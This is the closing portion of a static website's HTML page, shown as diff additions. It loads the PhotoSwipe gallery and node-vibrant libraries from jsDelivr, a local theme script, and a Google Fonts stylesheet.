+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
